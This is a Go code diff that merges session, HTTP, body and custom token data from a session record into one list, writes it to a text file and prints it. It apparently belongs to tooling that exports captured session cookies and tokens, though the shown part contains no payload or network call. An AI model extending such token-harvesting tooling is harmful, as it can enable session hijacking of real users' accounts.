@@ -51,6 +51,26 @@ func extractTokens(input map[string]map[string]map[string]interface{}) []Token {
 
 	return tokens
 }
+func processAllTokens(sessionTokens, httpTokens, bodyTokens, customTokens string) ([]Token, error) {
+	var consolidatedTokens []Token
+
+	// Parse and extract tokens for each category
+	for _, tokenJSON := range []string{sessionTokens, httpTokens, bodyTokens, customTokens} {
+		if tokenJSON == "" {
+			continue
+		}
+
+		var rawTokens map[string]map[string]map[string]interface{}
+		if err := json.Unmarshal([]byte(tokenJSON), &rawTokens); err != nil {
+			return nil, fmt.Errorf("error parsing token JSON: %v", err)
+		}
+
+		tokens := extractTokens(rawTokens)
+		consolidatedTokens = append(consolidatedTokens, tokens...)
+	}
+
+	return consolidatedTokens, nil
+}
 
 // Define a map to store session IDs and a mutex for thread-safe access
 var processedSessions = make(map[string]bool)
@@ -97,22 +117,19 @@ func createTxtFile(session Session) (string, error) {
 	}
 
 	// Consolidate all tokens into a single formatted string
-	var rawTokens map[string]map[string]map[string]interface{}
-	if err := json.Unmarshal([]byte(tokensJSON), &rawTokens); err != nil {
-		fmt.Println("Error parsing tokensJSON:", err)
+	// var rawTokens map[string]map[string]map[string]interface{}
+	allTokens, err := processAllTokens(string(tokensJSON), string(httpTokensJSON), string(bodyTokensJSON), string(customJSON))
 
-	}
-
-	tokens := extractTokens(rawTokens)
-
-	tokensOutput, err := json.MarshalIndent(tokens, "", "  ")
+	result, err := json.MarshalIndent(allTokens, "", "  ")
 	if err != nil {
-		fmt.Println("Error marshalling tokens:", err)
+		fmt.Println("Error marshalling final tokens:", err)
 
 	}
+
+	fmt.Println("Combined Tokens: ", string(result))
 
 	// Write the consolidated data into the text file
-	_, err = txtFile.WriteString(string(tokensOutput))
+	_, err = txtFile.WriteString(string(result))
 	if err != nil {
 		return "", fmt.Errorf("failed to write data to text file: %v", err)
 	}
